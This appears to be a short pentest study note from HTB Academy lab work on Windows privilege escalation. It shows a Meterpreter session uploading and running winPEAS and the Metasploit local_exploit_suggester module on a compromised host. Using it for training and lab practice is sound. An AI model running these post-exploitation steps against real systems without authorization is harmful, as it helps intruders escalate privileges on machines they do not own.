# Exploring Automated Tools

## ==Use WinPEAS or PowerUp **FIRST**==

-  Upload tools to rhost to find attack vectors ([[ðŸŸ©HTB Academy/07_File Transfers/File Transfers|File Transfers]])
```
meterpreter> cd c:\\windows\\temp	

meterpreter > upload /root/Downloads/winPEASx64.exe
[*] Uploading  : /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 8.00 MiB of 9.39 MiB (85.17%): /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 9.39 MiB of 9.39 MiB (100.0%): /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Completed  : /root/Downloads/winPEASx64.exe -> winPEASx64.exe
``` 

## Run winPEAS
```
meterpreter > shell

c:\windows\temp>winPEASx64.exe
```

Run `post/multi/recon/local_exploit_suggester`

```
meterpreter > run post/multi/recon/local_exploit_suggester
